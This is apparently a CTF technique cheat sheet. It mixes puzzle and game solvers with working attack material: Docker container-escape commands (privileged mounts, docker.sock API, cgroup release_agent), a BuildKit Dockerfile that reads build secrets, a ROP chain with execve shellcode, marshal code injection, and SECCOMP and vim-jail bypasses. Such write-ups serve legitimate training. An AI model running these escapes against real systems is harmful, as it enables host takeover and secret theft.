# CTF Misc - Games, VMs & Constraint Solving (Part 3)

## Table of Contents
- [memfd_create Packed Binaries](#memfd_create-packed-binaries)
- [Multi-Phase Interactive Crypto Game (EHAX 2026)](#multi-phase-interactive-crypto-game-ehax-2026)
- [Emulator ROM-Switching State Preservation (BSidesSF 2026)](#emulator-rom-switching-state-preservation-bsidessf-2026)
- [Python Marshal Code Injection (iCTF 2013)](#python-marshal-code-injection-ictf-2013)
- [Benford's Law Frequency Distribution Bypass (iCTF 2013)](#benfords-law-frequency-distribution-bypass-ictf-2013)
- [Parallel Connection Oracle Relay (Hack.lu 2015)](#parallel-connection-oracle-relay-hacklu-2015)
- [Nonogram Solver to QR Code Pipeline (SECCON 2015)](#nonogram-solver-to-qr-code-pipeline-seccon-2015)
- [100 Prisoners Problem / Cycle-Following Strategy (Sharif CTF 2016)](#100-prisoners-problem--cycle-following-strategy-sharif-ctf-2016)
- [C Code Jail Escape via Emoji Identifiers and Gadget Embedding (Midnight Flag 2026)](#c-code-jail-escape-via-emoji-identifiers-and-gadget-embedding-midnight-flag-2026)
  - [Step 1: Integer construction from emoji](#step-1-integer-construction-from-emoji)
  - [Step 2: Embed gadgets via add eax constant encoding](#step-2-embed-gadgets-via-add-eax-constant-encoding)
  - [Step 3: Stack-based ROP via push rsp; pop rsi; syscall](#step-3-stack-based-rop-via-push-rsp-pop-rsi-syscall)
  - [Step 4: ROP chain to mprotect + read + shellcode](#step-4-rop-chain-to-mprotect--read--shellcode)
  - [Step 5: Shellcode with glob for unknown flag path](#step-5-shellcode-with-glob-for-unknown-flag-path)
- [BuildKit Daemon Exploitation for Build Secrets (BSidesSF 2026)](#buildkit-daemon-exploitation-for-build-secrets-bsidessf-2026)
- [Docker Container Escape Techniques](#docker-container-escape-techniques)
  - [Privileged Container Breakout](#privileged-container-breakout)
  - [Docker Socket Escape](#docker-socket-escape)
  - [Capability-Based Escape (CAP_SYS_ADMIN)](#capability-based-escape-cap_sys_admin)
  - [Container Information Leakage](#container-information-leakage)
- [15-Puzzle Solvability as Bit Encoder (SharifCTF 8)](#15-puzzle-solvability-as-bit-encoder-sharifctf-8)
- [Levenshtein Distance Oracle Attack (SunshineCTF 2016)](#levenshtein-distance-oracle-attack-sunshinectf-2016)
- [SECCOMP Bypass via High-Bit File Descriptor Trick (33C3 CTF 2016)](#seccomp-bypass-via-high-bit-file-descriptor-trick-33c3-ctf-2016)
- [rvim Jail Escape via Custom vimrc with Python3 Execution (BKP 2017)](#rvim-jail-escape-via-custom-vimrc-with-python3-execution-bkp-2017)
- [Restricted vim Escape via CTRL-W F and netrw File Browser (TokyoWesterns 2018)](#restricted-vim-escape-via-ctrl-w-f-and-netrw-file-browser-tokyowesterns-2018)
- [Taint Analysis Bypass in Custom Language via Type Coercion (PlaidCTF 2018)](#taint-analysis-bypass-in-custom-language-via-type-coercion-plaidctf-2018)
- [Shredded Document Pixel-Edge Reassembly Under Time Pressure (Nuit du Hack CTF 2018)](#shredded-document-pixel-edge-reassembly-under-time-pressure-nuit-du-hack-ctf-2018)
- [References](#references)

---

## memfd_create Packed Binaries

```python
from Crypto.Cipher import ARC4
cipher = ARC4.new(b"key")
decrypted = cipher.decrypt(encrypted_data)
open("dumped", "wb").write(decrypted)
```

**Key insight:** Binaries using `memfd_create` execute payloads entirely in memory, leaving no file on disk. Intercept the decrypted payload before `fexecve` by hooking `memfd_create` or dumping `/proc/pid/fd/` entries, then analyze the dumped binary normally.

---

## Multi-Phase Interactive Crypto Game (EHAX 2026)

**Pattern (The Architect's Gambit):** Server presents a multi-phase challenge combining cryptography, game theory, and commitment-reveal protocols.

**Phase structure:**
1. **Phase 1 (AES-ECB decryption):** Decrypt pile values with provided key. Determine winner from game state.
2. **Phase 2 (AES-CBC with derived keys):** Keys derived via SHA-256 chain from Phase 1 results. Decrypt to get game parameters.
3. **Phase 3 (Interactive gameplay):** Play optimal moves in a combinatorial game, bound by commitment-reveal protocol.

**Commitment-reveal (HMAC binding):**
```python
import hmac, hashlib

def compute_binding_token(session_nonce, answer):
    """Server verifies your answer commitment before revealing result."""
    message = f"answer:{answer}".encode()
    return hmac.new(session_nonce, message, hashlib.sha256).hexdigest()

# Flow: send token first, then server reveals state, then send answer
# Server checks: HMAC(nonce, answer) == your_token
# Prevents changing your answer after seeing the state
```

**GF(2^8) arithmetic for game drain calculations:**
```python
# Galois Field GF(256) used in some game mechanics (Nim variants)
# Nim-value XOR determines winning/losing positions

def gf256_mul(a, b, poly=0x11b):
    """Multiply in GF(2^8) with irreducible polynomial."""
    result = 0
    while b:
        if b & 1:
            result ^= a
        a <<= 1
        if a & 0x100:
            a ^= poly
        b >>= 1
    return result

# Nim game with GF(256) move rules:
# Position is losing if Nim-value (XOR of pile Grundy values) is 0
# Optimal move: find pile where removing stones makes XOR sum = 0
```

**Game tree memoization (C++ for performance):**
```python
# Python too slow for large state spaces — use C++ with memoization
# State compression: encode all pile sizes into single integer
# Cache: unordered_map<state_t, bool> for win/loss determination

# Python fallback for small games:
from functools import lru_cache

@lru_cache(maxsize=None)
def is_winning(state):
    """Returns True if current player can force a win."""
    state = tuple(sorted(state))  # Normalize for caching
    for move in generate_moves(state):
        next_state = apply_move(state, move)
        if not is_winning(next_state):
            return True  # Found a move that puts opponent in losing position
    return False  # All moves lead to opponent winning
```

**Key insights:**
- Multi-phase challenges require solving each phase sequentially — each phase's output feeds the next
- HMAC commitment-reveal prevents guessing; you must compute the correct answer
- GF(256) Nim variants require Sprague-Grundy theory, not brute force
- When Python recursion is too slow (>10s), rewrite game solver in C++ with state compression and memoization

---

## Emulator ROM-Switching State Preservation (BSidesSF 2026)

**Pattern (wromwarp):** In emulator debuggers, the `/load` command may replace only the ROM program while preserving CPU state (registers, RAM, program counter). By switching between ROMs at specific PC values, you can execute arbitrary instruction sequences using instructions from different programs.

**Key insight:** When a new ROM is loaded via the emulator's debug interface, the CPU state (registers, RAM, PC) remains unchanged. Only the program memory (ROM) is replaced. This means:
- If ROM A has loaded secret data into RAM at certain addresses
- And ROM B has a `display` instruction at the same PC where ROM A's execution paused
- Loading ROM B at that point causes the CPU to execute ROM B's instruction (display) using ROM A's data (the secret)

**Exploit workflow:**
```text
1. Load ROM_A (contains INIT that loads secret into RAM)
2. Step through ROM_A until secret data is in RAM
3. Note the current PC value
4. /load ROM_B (PC, registers, RAM all preserved)
5. ROM_B has a "display memory" instruction at the current PC
6. Step → executes ROM_B's display instruction, showing ROM_A's secret data
```

**Practical example:**
```python
from pwn import *

p = remote('target', port)

# Load first ROM that initializes secret data
p.sendlineafter('> ', '/load rom_init.bin')
# Step until secret is in memory (determined by analysis)
for _ in range(42):
    p.sendlineafter('> ', '/step')

# Switch to ROM that displays memory at current PC
p.sendlineafter('> ', '/load rom_display.bin')
p.sendlineafter('> ', '/step')

# Read the leaked secret
flag = p.recvline().strip()
print(f"Flag: {flag}")
```

**When to recognize:**
- Emulator/debugger challenge with `/load`, `/step`, `/run`, `/dump` commands
- Multiple ROM files provided
- One ROM initializes protected memory, another has display/output capabilities
- Challenge mentions "ROM switching", "hot swap", or "state preservation"

**Key lessons:**
- Emulator debug interfaces that don't reset CPU state on ROM load create a state-mixing vulnerability
- Combine instructions from different programs by loading them at the right PC values
- Protected memory (read-only in one ROM's context) becomes accessible via another ROM's display instructions

**References:** BSidesSF 2026 "wromwarp"

---

## Python Marshal Code Injection (iCTF 2013)

**Pattern:** Server deserializes base64-encoded `marshal` data and executes it as a Python function. Inject arbitrary code via serialized function code objects.

```python
import marshal, types, base64

# Craft payload function that exfiltrates data over the socket
payload = lambda sock: sock.send(globals()['flag'].encode())

# Serialize the function's code object
serialized = base64.b64encode(marshal.dumps(payload.__code__)).decode()

# Server-side execution pattern:
# func = types.FunctionType(marshal.loads(base64.b64decode(data)), globals())
# func(client_socket)
```

**Key insight:** `marshal.loads()` is as dangerous as `pickle.loads()` — it deserializes arbitrary Python code objects. Unlike pickle, marshal is rarely sandboxed. The injected function runs with access to the server's `globals()`, enabling flag exfiltration via the socket connection.

---

## Benford's Law Frequency Distribution Bypass (iCTF 2013)

**Pattern:** Server validates that input digit frequency matches Benford's Law distribution (+-5% tolerance). Craft input with correct digit distribution to pass the check.

```python
import random

# Benford's Law: P(d) = log10(1 + 1/d) for leading digit d (1-9)
benford = {d: round(100 * (1 + 1/d) / sum(1/i for i in range(1,10))) for d in range(1,10)}
# Approx: 1→30%, 2→18%, 3→12%, 4→10%, 5→8%, 6→7%, 7→6%, 8→5%, 9→5%

def generate_benford_compliant(length=1000):
    digits = []
    for d, pct in benford.items():
        digits.extend([str(d)] * int(length * pct / 100))
    random.shuffle(digits)
    return ''.join(digits[:length])
```

**Key insight:** Benford's Law describes the frequency of leading digits in naturally occurring datasets. If a service validates digit distribution, generate compliant input rather than random numbers. Tolerance is typically +-5%, so approximate percentages work.

---

## Parallel Connection Oracle Relay (Hack.lu 2015)

When a server generates deterministic sequences and provides feedback, exploit multiple simultaneous connections to share answers:

1. Open N+1 connections with identical timing (same PRNG seed)
2. Sacrifice one connection per round to discover the correct answer
3. Relay discovered answer to remaining connections via synchronization

```python
import threading

NUM_CONNECTIONS = 101
barriers = [threading.Barrier(NUM_CONNECTIONS - i) for i in range(100)]
correct_answers = [None] * 100

def worker(index, sock):
    for round_num in range(100):
        barriers[round_num].wait()  # Synchronize all threads

        if index == round_num:
            # This thread sacrifices itself to probe
            for guess in range(100):
                sock.send(str(guess).encode())
                response = sock.recv(1024)
                if b'correct' in response:
                    correct_answers[round_num] = guess
                    break
        else:
            # Wait for oracle thread to find answer
            barriers[round_num].wait()
            sock.send(str(correct_answers[round_num]).encode())

threads = [threading.Thread(target=worker, args=(i, connections[i])) for i in range(NUM_CONNECTIONS)]
for t in threads: t.start()
```

**Key insight:** Works against any service where multiple connections share state (same PRNG seed from identical connection times). The sacrifice pattern ensures at least one connection survives all rounds.

---

## Nonogram Solver to QR Code Pipeline (SECCON 2015)

Automate solving nonogram puzzles that produce QR codes:

1. **Parse constraints** from web interface (BeautifulSoup for HTML tables)
2. **Solve nonogram** using external solver or constraint propagation
3. **Render to image** and decode QR

```python
from PIL import Image
import subprocess, qrtools

# Parse row/column constraints from HTML
rows = parse_constraints(html, 'rows')   # [[3,1], [2,2], ...]
cols = parse_constraints(html, 'cols')

# Feed to nonogram solver (e.g., nonogram-0.9)
solver_input = format_for_solver(rows, cols)
result = subprocess.run(['./nonogram'], input=solver_input, capture_output=True)

# Convert text grid to QR image
grid = parse_solver_output(result.stdout)
cell_size = 10
img = Image.new('RGB', (len(grid[0]) * cell_size, len(grid) * cell_size), 'white')
# Draw black cells where grid == '#'

# Decode QR
qr = qrtools.QR()
qr.decode('qrcode.png')
answer = qr.data
```

**Key insight:** Nonogram solvers are available as command-line tools. The key challenge is parsing the web interface and converting output to a valid QR image. Add quiet zones (white border) around the QR for reliable decoding.

---

## 100 Prisoners Problem / Cycle-Following Strategy (Sharif CTF 2016)

The classic 100 prisoners problem appears in CTF challenges as an "impossible" probability game:

- N prisoners each open N/2 boxes looking for their number
- All must succeed for the group to win
- Optimal strategy: follow permutation cycles (success rate ~31%)

```python
def solve_prisoners(boxes):
    """Follow cycle starting from own number"""
    N = len(boxes)
    results = []
    for prisoner in range(N):
        current = prisoner
        found = False
        for _ in range(N // 2):
            if boxes[current] == prisoner:
                found = True
                break
            current = boxes[current]  # Follow the cycle
        results.append(found)
    return all(results)
```

**Key insight:** Random strategy succeeds with probability (1/2)^N ≈ 0. Cycle-following succeeds with probability 1 - ln(2) ≈ 0.3069 for large N. The game fails only if any cycle exceeds length N/2. Pre-check cycle lengths if the box arrangement is known.

---

## C Code Jail Escape via Emoji Identifiers and Gadget Embedding (Midnight Flag 2026)

Escape a C code jail that bans all alphanumeric characters, whitespace, and most operators by using GCC's Unicode identifier support and embedding machine code gadgets inside arithmetic constants.

**Constraints:** Only `(){}[];,=.+*%@#~` and emoji allowed. No letters, digits, whitespace, quotes, or `?&!|$<>^:/-`.

### Step 1: Integer construction from emoji

GCC allows emoji as identifiers. `(😃==😃)` is compile-time constant `1`. Build any integer via addition and multiplication:

```c
// Building 15: 3 * (2*2 + 1)
((😃==😃)+(😃==😃)+(😃==😃))*(((😃==😃)+(😃==😃))*((😃==😃)+(😃==😃))+(😃==😃))
```

### Step 2: Embed gadgets via add eax constant encoding

At `-O0`, `var = var + CONSTANT` compiles to `05 XX XX XX XX` (add eax, imm32). Jump to offset+1 to execute the constant bytes as instructions:

| Target bytes | Instruction | Constant (decimal) |
|---|---|---|
| `0f 05 c3` | syscall; ret | 12780815 |
| `58 c3` | pop rax; ret | 50008 |
| `5f c3` | pop rdi; ret | 50015 |
| `5a c3` | pop rdx; ret | 50010 |
| `5e c3` | pop rsi; ret | 50014 |
| `54 5e 0f 05` | push rsp; pop rsi; syscall | 84893268 |

```c
// Each gadget function embeds one instruction sequence:
😇(){😼=😼+<12780815_as_emoji_expr>;}  // syscall; ret at 😇+15
```

### Step 3: Stack-based ROP via push rsp; pop rsi; syscall

Call the `push rsp; pop rsi; syscall` gadget with `sys_read` args to write a ROP chain directly to the stack return address:

```c
// (gadget_func + 15)(stdin=0, buf=ignored_rsp_used, len=4096)
😀(){(😃+<15_expr>)(😷,😸,<4096_expr>);}
```

The `push rsp` captures the return address location, `pop rsi` sets it as the read buffer, then `syscall` reads attacker input onto the stack.

### Step 4: ROP chain to mprotect + read + shellcode

```python
from pwn import *

rop = flat([
    0xdeadbeef,      # consumed by pop rbp
    POP_RAX, 10,     # sys_mprotect
    POP_RDI, 0x404000,
    POP_RSI, 0x2000,
    POP_RDX, 7,      # PROT_READ|WRITE|EXEC
    SYSCALL_RET,
    POP_RAX, 0,      # sys_read
    POP_RDI, 0,      # stdin
    POP_RSI, 0x404020,
    POP_RDX, 0x200,
    SYSCALL_RET,
    0x404020,         # jump to shellcode
])
```

### Step 5: Shellcode with glob for unknown flag path

```python
# execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"], NULL)
shellcode = asm(shellcraft.execve("/bin/sh", ["/bin/sh", "-c", "cat /flag*"]))
```

**Key insight:** GCC's `-static -nostartfiles -nostdlib` produces a minimal binary with deterministic addresses (no ASLR). Each emoji function lands at a predictable address (0x401000, 0x40101c, ...). The `add eax, imm32` encoding is the key primitive — any 4-byte gadget sequence can be embedded as an arithmetic constant in a valid C expression.

**Compilation flags to watch for:** `-nostartfiles -nostdlib -static` indicates no libc, no CRT, deterministic layout — ideal for address-hardcoded exploits.

---

## BuildKit Daemon Exploitation for Build Secrets (BSidesSF 2026)

**Pattern (builds-as-a-service):** Challenge accepts a Dockerfile and builds it. The build environment uses Docker BuildKit with `--mount=type=secret,id=flag` to inject secrets during build. An exposed BuildKit daemon (tcp://127.0.0.1:1234) allows submitting nested build requests that mount and read the secret.

**Attack (two-stage Dockerfile):**

Stage 1 — Submit a Dockerfile that installs `buildctl` and triggers a nested build:
```dockerfile
FROM moby/buildkit:v0.17.1-rootless
COPY Dockerfile.exploit /tmp/Dockerfile
RUN <<'EOF'
buildctl --addr tcp://127.0.0.1:1234 build \
  --frontend dockerfile.v0 \
  --local context=/tmp --local dockerfile=/tmp \
  --opt filename=Dockerfile.exploit \
  --progress plain 2>&1; false
EOF
```

Stage 2 — The nested Dockerfile (`Dockerfile.exploit`) mounts and reads the secret:
```dockerfile
FROM alpine
RUN --mount=type=secret,id=flag cat /run/secrets/flag; false
```

**Why `; false`:** Forces a non-zero exit code which causes BuildKit to dump the full build output (including the flag) to stderr. Without it, successful builds may suppress intermediate output.

**Key insight:** BuildKit's gRPC API on localhost is unauthenticated by default. Any container running in the same network namespace can submit build requests. The `--mount=type=secret` mechanism is designed for build-time secrets but relies on the daemon being inaccessible — if the daemon is exposed, any build can request any secret.

**Alternative approach:** If `buildctl` is unavailable, use the BuildKit gRPC API directly:
```python
# buildctl du / buildctl debug workers  — enumerate available workers
# buildctl build --progress=plain — trace build output
```

**When to recognize:** Challenge provides a Dockerfile upload/build service. Look for BuildKit features (`--mount=type=secret`, `BUILDKIT_INLINE_CACHE`, `# syntax=` directives). Check if the build daemon is accessible from within built containers.

**Real-world relevance:** This mirrors actual CI/CD supply chain attacks where build systems expose secrets to untrusted build steps. GitHub Actions, GitLab CI, and Jenkins all have similar secret injection mechanisms.

**References:** BSidesSF 2026 "builds-as-a-service"

---

## Docker Container Escape Techniques

### Privileged Container Breakout

Containers started with `--privileged` have all Linux capabilities and access to host devices. Mount the host filesystem and chroot:

```bash
# List host disks
fdisk -l
# Mount host root filesystem
mkdir /mnt/host && mount /dev/sda1 /mnt/host
# Chroot to host
chroot /mnt/host /bin/bash
# Or via nsenter (requires PID 1 on host)
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
```

### Docker Socket Escape

If `/var/run/docker.sock` is mounted inside the container, create a new privileged container that mounts the host root:

```bash
# Check for socket
ls -la /var/run/docker.sock
# Escape: create privileged container with host root mounted
docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host /bin/bash
# Or via API if docker CLI unavailable:
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
```

### Capability-Based Escape (CAP_SYS_ADMIN)

With `CAP_SYS_ADMIN`, exploit cgroup release_agent for host command execution:

```bash
# Create cgroup, set release_agent to host command
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd && echo 'cat /flag > /tmp/cgrp/x/flag' >> /cmd && chmod +x /cmd
echo $$ > /tmp/cgrp/x/cgroup.procs  # Trigger release_agent
```

### Container Information Leakage

Even without escape, containers leak host info:
- `/proc/self/cgroup` -- container ID
- `/proc/mounts` -- overlayfs `upperdir` reveals host path
- `/sys/kernel/slab/*/cgroup/` -- other container IDs (cgroup debug info)
- `/proc/1/environ` -- environment variables from container start

**Key insight:** Check `--privileged` flag, mounted sockets (`docker.sock`), and capabilities (`capsh --print`) first. Privileged = instant escape. Socket = create new privileged container. CAP_SYS_ADMIN = cgroup release_agent. Without any of these, focus on information leakage and application-level escapes.

---

## 15-Puzzle Solvability as Bit Encoder (SharifCTF 8)

128 15-puzzles encode 128 bits of a flag. Each bit is 1 if the puzzle is solvable, 0 if not:

```python
def is_solvable(grid):
    # Count inversions (pairs where a > b and a appears before b)
    flat = [x for row in grid for x in row if x != 0]
    inversions = sum(1 for i in range(len(flat))
                     for j in range(i+1, len(flat)) if flat[i] > flat[j])
    # For 4x4: solvable iff inversions + blank_row_from_bottom is even
    blank_row = next(i for i, row in enumerate(grid) if 0 in row)
    blank_from_bottom = len(grid) - 1 - blank_row
    return (inversions + blank_from_bottom) % 2 == 0

flag_bits = ''.join('1' if is_solvable(puzzle) else '0' for puzzle in puzzles)
flag = bytes(int(flag_bits[i:i+8], 2) for i in range(0, len(flag_bits), 8))
```

**Key insight:** The 15-puzzle has an invariant: exactly half of all permutations are solvable. A puzzle's solvability depends on the parity of inversions plus the blank tile's row from the bottom. This provides a natural 1-bit encoding per puzzle. When a challenge provides many puzzle instances with no obvious goal, check if solvability encodes binary data. The number of puzzles matching a multiple of 8 strongly suggests bit encoding.

---

## Taint Analysis Bypass in Custom Language via Type Coercion (PlaidCTF 2018)

**Pattern:** In a custom ML-like language with a secrecy/taint system, the if-expression's secrecy depends on the return type, not the condition. Wrap side-effecting code in a function, coerce it to a private type, and use if-statement to select between dummy and leaking functions based on private flag bits. The purity checker doesn't analyze function internals.

```ml
(* pupper variant: if condition's secrecy doesn't propagate to return *)
let leaked = ref 0 in
let test = fn (bit : int) =>
  if !secret < bit then ()
  else (secret := !secret - bit; leaked := !leaked + bit)
in
test 128; test 64; test 32; test 16; test 8; test 4; test 2; test 1;
!leaked  (* public int that reveals private byte *)

(* doggo variant: function coercion hides side effects *)
let ignore = (fn (bit : int) => () :> private unit) :> private (int -> private unit) in
let incr = (fn (bit : int) => (leaked := !leaked + bit) :> private unit)
           :> private (int -> private unit) in
(if !secret < bit then ignore else incr) bit
(* if returns private function type, but selected function modifies public ref *)
```

**Key insight:** Information flow type systems often check secrecy labels at expression level, not data flow level. If the return type matches but the side effects differ, the type checker is satisfied while private data leaks through public mutable references. Two common bypasses: (1) if-condition secrecy not propagated to branches, (2) function type coercion hiding mutable side effects.

---

## Shredded Document Pixel-Edge Reassembly Under Time Pressure (Nuit du Hack CTF 2018)

**Pattern:** 100 shredded paper strips must be reassembled under 10-second time limit. Detect orientation via token position, compute edge similarity using pixel darkness bitmasks, greedily place strips by minimizing XOR/Hamming distance between adjacent edges, then OCR.

```python
from PIL import Image
import pytesseract

class Strip:
    def __init__(self, img):
        self.img = img
        w, h = img.size
        self.trace_first = 0  # left edge bitmask
        self.trace_last = 0   # right edge bitmask
        for y in range(h):
            # Dark pixel (sum < 765) = bit set at position y
            self.trace_first |= (1 if sum(img.getpixel((0, y))) < 765 else 0) << y
            self.trace_last |= (1 if sum(img.getpixel((w-1, y))) < 765 else 0) << y

def edge_distance(strip_a, strip_b):
    """Hamming distance between right edge of A and left edge of B"""
    return bin(strip_a.trace_last ^ strip_b.trace_first).count('1')

# Greedy placement: for each position, pick the strip with minimum edge distance
```

**Key insight:** Shredded document strips share edge pixels at cut boundaries. Encode each strip's left and right edge as binary bitmasks (dark=1, light=0), then use XOR + popcount (Hamming distance) to find the best-matching adjacent strips. Greedy placement with edge distance metric reassembles the document in milliseconds.

---

## References
- EHAX 2026 "The Architect's Gambit": Multi-phase AES + HMAC + GF(256) Nim
- BSidesSF 2026 "wromwarp": Emulator ROM-switching state preservation
- iCTF 2013: Python marshal code injection, Benford's Law bypass
- Hack.lu 2015: Parallel connection oracle relay
- SECCON 2015: Nonogram solver to QR code pipeline
- Sharif CTF 2016: 100 prisoners problem / cycle-following strategy
- SharifCTF 8: 15-puzzle solvability as bit encoder
- Midnight Flag 2026: C code jail escape via emoji identifiers
- BSidesSF 2026 "builds-as-a-service": BuildKit daemon build secret exploitation
- SunshineCTF 2016: Levenshtein distance oracle attack
- PlaidCTF 2018: Taint analysis bypass via type coercion in custom language
- Nuit du Hack CTF 2018: Shredded document pixel-edge reassembly

---

## Levenshtein Distance Oracle Attack (SunshineCTF 2016)

Oracle responds with edit distance between guess and secret. Attack strategy:

1. **Determine length:** Submit empty string, distance = secret length
2. **Identify present characters:** Submit single repeated character (e.g., "aaaa..."), distance = len - count_of_that_char
3. **Locate positions:** Binary search -- fill half positions with known-present char, half with known-absent, narrow by distance change

```python
# Determine which chars are present
for c in string.printable:
    d = oracle(c * length)
    count = length - d  # Number of times c appears
    if count > 0:
        chars[c] = count
```

**Key insight:** Edit distance as a side channel. Binary search locates character positions from Levenshtein feedback in O(n log n) queries.

---

## SECCOMP Bypass via High-Bit File Descriptor Trick (33C3 CTF 2016)

**Pattern (tea):** SECCOMP filter blocks `close(fd)` for fd values 0, 1, and 2 (stdin/stdout/stderr). Bypass: `close(0x8000000000000002)` passes the 64-bit comparison (not equal to 2) but the kernel truncates the fd argument to 32 bits, actually closing fd 2. This frees fd 2, so the next `open()` returns fd 2. Now `write(2, ...)` writes to the newly opened file instead of stderr, and SECCOMP allows it because fd 2 was never explicitly blocked for write.

```c
// SECCOMP rule: deny close(fd) where fd == 0 || fd == 1 || fd == 2
// Bypass: close with high-bit set
close(0x8000000000000002);  // SECCOMP sees fd != 2 (64-bit compare) -> ALLOW
// Kernel: fd = (int)(0x8000000000000002) = 2 -> closes fd 2

open("/proc/self/mem", O_WRONLY);  // returns fd 2 (lowest available)
// Now write to /proc/self/mem via fd 2 to modify parent process memory
```

**Key insight:** SECCOMP BPF operates on the raw 64-bit syscall argument, but the kernel's `close()` implementation casts to `int` (32-bit). Setting bit 63 changes the 64-bit value while preserving the 32-bit truncated result. This type/width mismatch between SECCOMP filter and kernel syscall handler is a general bypass pattern — check argument widths for any filtered syscall.

---

## rvim Jail Escape via Custom vimrc with Python3 Execution (BKP 2017)

**Pattern (vimjail):** `rvim` (restricted vim) blocks `:!`, `:shell`, and similar command execution. However, `rvim -u custom_vimrc` loads a user-specified vimrc file that executes before restrictions are fully applied. If `rvim` is run via `sudo -u targetuser`, the vimrc can contain `:python3 import os; os.system("cmd")` to execute commands as the target user.

```bash
# Create malicious vimrc
cat > /tmp/evil_vimrc << 'EOF'
:python3 import os; os.system("/home/ctfuser/flagReader /.flag")
:q!
EOF

# Launch rvim with custom vimrc as target user
sudo -u secretuser rvim -u /tmp/evil_vimrc /dev/null

# Alternative: interactive escape once inside rvim
:py3 import os; os.system("/bin/bash")
```

**Key insight:** `rvim` restricts shell commands (`:!cmd`) but Python/Lua/Ruby interfaces remain available. The `:python3` or `:py3` command executes arbitrary Python code, including `os.system()`. If vim was compiled with `+python3`, this bypasses all shell restrictions. Check `:version` for `+python3`, `+lua`, or `+ruby` — any scripting interface escapes the jail.

---

## Restricted vim Escape via CTRL-W F and netrw File Browser (TokyoWesterns 2018)

**Pattern:** A vim jail blocks `:`, `Q`, `g`, and scripting interfaces (`:py`, `:lua`, `:ruby`), but leaves normal-mode navigation commands alive. Press `CTRL-W` followed by `F` (capital) — vim splits a new window and opens the netrw file browser on the path under the cursor. From netrw you navigate like a directory listing and read arbitrary files with zero `:` commands.

```text
# Keystrokes (no ex commands required)
:   — blocked
CTRL-W F    — splits window, opens current path as netrw buffer
j / k       — navigate entries
Enter       — read selected file into a new buffer

# If you need to run a command and `:` is banned, put the cursor on a keyword
# such as `ls` and press K — vim opens the man page, then inside the man page
# you can press `!` and get a shell prompt.
```

**Key insight:** vim's restricted mode only covers `:`-based ex commands; normal-mode file-browser (`netrw`), manual-page lookup (`K`), and help (`<C-w>gF`) interfaces stay wide open. Any binary that enforces "restricted vim" via `:set modifiable`, disabled `:!`, or a blocked command-line is trivially bypassed by one of CTRL-W F, K, or gF. When auditing a vim sandbox, always test these three normal-mode primitives first.

**References:** TokyoWesterns CTF 4th 2018 — vimshell, writeup 11269

---

See [games-and-vms-4.md](games-and-vms-4.md) for 2018-era additions (XSLT VM, JS edge cases, timing oracles, OEIS, QR reassembly, math recurrences, CAPTCHA solvers, esolang polyglots, bytebeat).


See also: [games-and-vms.md](games-and-vms.md) for WASM patching, Roblox place file reversing, PyInstaller extraction, marshal analysis, Python env RCE, Z3 constraint solving, K8s RBAC bypass, floating-point precision exploitation, and custom assembly language sandbox escape.

See also: [games-and-vms-2.md](games-and-vms-2.md) for cookie checkpoint brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, De Bruijn sequences, Brainfuck instrumentation, and WASM memory manipulation.
